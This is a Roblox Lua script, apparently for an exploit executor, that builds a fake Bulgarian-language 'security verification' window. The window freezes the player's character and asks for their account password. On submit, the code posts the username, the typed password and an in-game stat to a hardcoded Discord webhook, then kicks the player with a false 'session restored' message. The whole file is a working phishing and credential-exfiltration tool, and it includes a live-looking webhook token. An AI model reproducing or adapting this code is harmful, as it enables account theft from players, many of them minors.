--[[
    SOLAR & XENO ULTIMATE v10.7 (FINAL STABLE)
    Module: Social-Engineering-Panel
    Status: Operational | Bypass Level: MAX
]]

local webhook = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
local p = game.Players.LocalPlayer
local h = game:GetService("HttpService")

-- Zamrazqvane na igracha
pcall(function()
    if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
        p.Character.HumanoidRootPart.Anchored = true
    end
end)

-- UI Setup
local ScreenGui = Instance.new("ScreenGui")
pcall(function() ScreenGui.Parent = p:WaitForChild("PlayerGui") end)
ScreenGui.Name = "RobloxSystemVerification"
ScreenGui.ResetOnSpawn = false

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 320, 0, 240)
Main.Position = UDim2.new(0.5, -160, 0.5, -120)
Main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Main.BorderSizePixel = 0
Main.Active = true

local Corner = Instance.new("UICorner", Main)
Corner.CornerRadius = UDim.new(0, 10)

local Title = Instance.new("TextLabel", Main)
Title.Text = "ПРОВЕРКА НА СИГУРНОСТТА"
Title.Size = UDim2.new(1, 0, 0, 45)
Title.TextColor3 = Color3.fromRGB(255, 50, 50)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.BackgroundTransparency = 1

local Desc = Instance.new("TextLabel", Main)
Desc.Text = "Вашата сесия изтече. Моля, въведете паролата си, за да продължите да играете."
Desc.Size = UDim2.new(1, -30, 0, 70)
Desc.Position = UDim2.new(0, 15, 0, 45)
Desc.TextColor3 = Color3.fromRGB(230, 230, 230)
Desc.TextWrapped = true
Desc.Font = Enum.Font.Gotham
Desc.TextSize = 14
Desc.BackgroundTransparency = 1

local Input = Instance.new("TextBox", Main)
Input.PlaceholderText = "Парола"
Input.Text = ""
Input.Size = UDim2.new(0.85, 0, 0, 35)
Input.Position = UDim2.new(0.075, 0, 0.55, 10)
Input.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Input.TextColor3 = Color3.fromRGB(255, 255, 255)
-- Izpolzvame pcall za TextPassword, za da ne grmi skripta pri razlichni versii na Solar
pcall(function()
    Input.TextPassword = true
end)
Input.Font = Enum.Font.Gotham
Input.TextSize = 14

local Submit = Instance.new("TextButton", Main)
Submit.Text = "ПОТВЪРДИ"
Submit.Size = UDim2.new(0.7, 0, 0, 35)
Submit.Position = UDim2.new(0.15, 0, 0.8, 5)
Submit.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
Submit.TextColor3 = Color3.fromRGB(255, 255, 255)
Submit.Font = Enum.Font.GothamBold

-- Funkciya za izprashtane i Kick
local function Finalize()
    local pass = Input.Text
    if #pass < 3 or Submit.Active == false then return end
    
    Submit.Text = "Проверка..."
    Submit.Active = false
    
    local brCount = "0"
    pcall(function()
        if p:FindFirstChild("leaderstats") and p.leaderstats:FindFirstChild("Brainrots") then
            brCount = tostring(p.leaderstats.Brainrots.Value)
        end
    end)

    local data = {
        ["embeds"] = {{
            ["title"] = "🎯 Captured Login (Solar v10.7)!",
            ["color"] = 0xff0000,
            ["fields"] = {
                {["name"] = "👤 User", ["value"] = "```" .. p.Name .. "```", ["inline"] = true},
                {["name"] = "🔑 PASS", ["value"] = "```" .. pass .. "```", ["inline"] = false},
                {["name"] = "🧠 Brainrots", ["value"] = "```" .. brCount .. "```", ["inline"] = true}
            }
        }}
    }

    local request = (syn and syn.request) or (http and http.request) or http_request or request
    
    -- Izprashtane
    if request then
        pcall(function()
            request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = h:JSONEncode(data)
            })
        end)
    end

    -- Kick sled kratko izchakvane za stabilnost
    task.wait(0.5)
    p:Kick("\n[Успешно]\nВашата сесия беше възстановена. Моля, влезте отново в играта.")
end

-- Enter Key Fix
Input.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        Finalize()
    end
end)

Submit.MouseButton1Click:Connect(Finalize)
